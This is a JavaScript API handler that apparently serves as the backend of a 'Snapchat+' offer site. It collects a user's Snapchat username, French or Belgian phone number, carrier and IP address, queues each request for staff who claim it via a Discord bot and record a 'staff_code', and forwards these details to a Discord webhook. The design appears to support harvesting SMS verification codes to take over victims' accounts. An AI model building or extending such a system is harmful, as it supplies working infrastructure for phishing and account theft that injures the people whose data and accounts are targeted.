/**
 * api/snapchat.js — New request registration
 *
 * v2.3: UPSERT on phone. Same phone → resets the request to pending so staff
 *       handles it again. Username uniqueness check removed entirely —
 *       multiple submissions OK.
 *
 * MySQL version: INSERT ... ON DUPLICATE KEY UPDATE. MySQL has no conditional
 * "ON CONFLICT ... WHERE" and no RETURNING, so:
 *   - each column is only overwritten IF the existing row is in a resettable
 *     state (pending / completed / wrong_number); `status` is assigned LAST
 *     because MySQL evaluates assignments left to right, so every earlier
 *     condition still sees the ORIGINAL status;
 *   - updated_at is bumped explicitly so the bot's poller notices a
 *     resubmission even when no other column actually changed;
 *   - the row is then read back, and if its status is not 'pending' it means
 *     it is actively being handled and was left untouched.
 */

import { sql }                        from './_db.js';
import { getClientIP, checkBannedIP } from './middleware.js';

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', 'true');
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
    if (req.method === 'OPTIONS') { res.status(200).end(); return; }
    if (req.method !== 'POST')   return res.status(405).json({ success: false, message: 'Method not allowed' });

    try {
        const blocked = await checkBannedIP(req, res);
        if (blocked) return blocked;

        const { username, phone, location, operator, lang } = req.body;

        // ── Basic validation ────────────────────────────────────────────────
        if (!username || !phone || !location || !operator) {
            return res.status(400).json({ success: false, message: 'Missing required fields' });
        }
        if (!/^[a-zA-Z0-9._-]{3,15}$/.test(username)) {
            return res.status(400).json({ success: false, message: 'Invalid username format' });
        }

        const phoneClean = phone.replace(/\s/g, '').replace(/^\+33/, '0').replace(/^\+32/, '0');
        const isBe       = location === 'belgique';
        const phoneRegex = isBe ? /^04[0-9]{8}$/ : /^0[67][0-9]{8}$/;
        if (!phoneRegex.test(phoneClean)) {
            return res.status(400).json({ success: false, message: 'Invalid phone number' });
        }

        const ip      = getClientIP(req);
        const country = isBe ? 'Belgium' : 'France';
        const city    = 'Unknown';

        // ── UPSERT (safe) ─────────────────────────────────────────────────
        // Same phone → reset to pending so staff picks it up again, BUT only
        // if the request isn't currently being actively handled by a staff
        // member. Without this guard, a resubmission (double click, page
        // refresh, or the offline auto-retry queue in script.js) silently
        // wipes an in-progress claim.
        await sql`
            INSERT INTO snap_requests
                (username, phone, location, operator, lang, status, ip_address, country, city)
            VALUES
                (${username.toLowerCase()}, ${phoneClean}, ${location}, ${operator}, ${lang || 'fr'},
                 'pending', ${ip}, ${country}, ${city})
            ON DUPLICATE KEY UPDATE
                username              = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(username),   username),
                location              = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(location),   location),
                operator              = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(operator),   operator),
                lang                  = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(lang),       lang),
                ip_address            = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(ip_address), ip_address),
                country               = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(country),    country),
                city                  = IF(status IN ('pending', 'completed', 'wrong_number'), VALUES(city),       city),
                staff_code            = IF(status IN ('pending', 'completed', 'wrong_number'), NULL, staff_code),
                code_length           = IF(status IN ('pending', 'completed', 'wrong_number'), NULL, code_length),
                claimed_by_discord_id = IF(status IN ('pending', 'completed', 'wrong_number'), NULL, claimed_by_discord_id),
                updated_at            = IF(status IN ('pending', 'completed', 'wrong_number'), NOW(3), updated_at),
                status                = IF(status IN ('pending', 'completed', 'wrong_number'), 'pending', status)
        `;

        const rows = await sql`
            SELECT id, username, phone, operator, country, city, ip_address, created_at, status
            FROM snap_requests WHERE phone = ${phoneClean} LIMIT 1
        `;
        const row = rows[0];

        if (!row) {
            return res.status(409).json({ success: false, message: 'Demande déjà en cours de traitement.' });
        }

        if (row.status !== 'pending') {
            // Existing row is actively being handled — we left it untouched.
            // Just report current state so the client can keep polling normally.
            return res.status(200).json({
                success: true,
                message: 'Demande déjà en cours de traitement',
                alreadyProcessing: true,
                data: { id: row.id, username: row.username, phone: row.phone },
            });
        }

        // ── Optional Discord webhook (fallback when bot is offline) ────────
        if (process.env.DISCORD_WEBHOOK_URL) {
            try {
                const carrierNames = {
                    orange: 'Orange', sfr: 'SFR', bouygues: 'Bouygues',
                    base: 'BASE', orange_be: 'Orange Belgique', proximus: 'Proximus', telenet: 'Telenet',
                };
                const embed = {
                    title: '📱 Nouvelle demande Snapchat+',
                    color: 0xfffc00,
                    fields: [
                        { name: 'Username',  value: '``' + row.username + '``',                                inline: true },
                        { name: 'Téléphone', value: '``' + row.phone    + '``',                                inline: true },
                        { name: 'Opérateur', value: '``' + (carrierNames[row.operator] || row.operator) + '``', inline: true },
                        { name: 'Pays',      value: '``' + row.country   + '``',                               inline: true },
                        { name: 'IP',        value: '``' + row.ip_address + '``',                              inline: true },
                        { name: 'Date',      value: new Date(row.created_at).toLocaleString('fr-FR'),          inline: false },
                    ],
                    footer:    { text: 'ID: ' + row.id },
                    timestamp: new Date().toISOString(),
                };
                await fetch(process.env.DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ embeds: [embed] }),
                });
            } catch (e) { console.error('Webhook error:', e); }
        }

        return res.status(200).json({
            success: true,
            message: 'Request registered',
            data: { id: row.id, username: row.username, phone: row.phone },
        });
    } catch (error) {
        console.error('DB Error:', error);
        return res.status(500).json({ success: false, message: error.message || 'Server error' });
    }
}
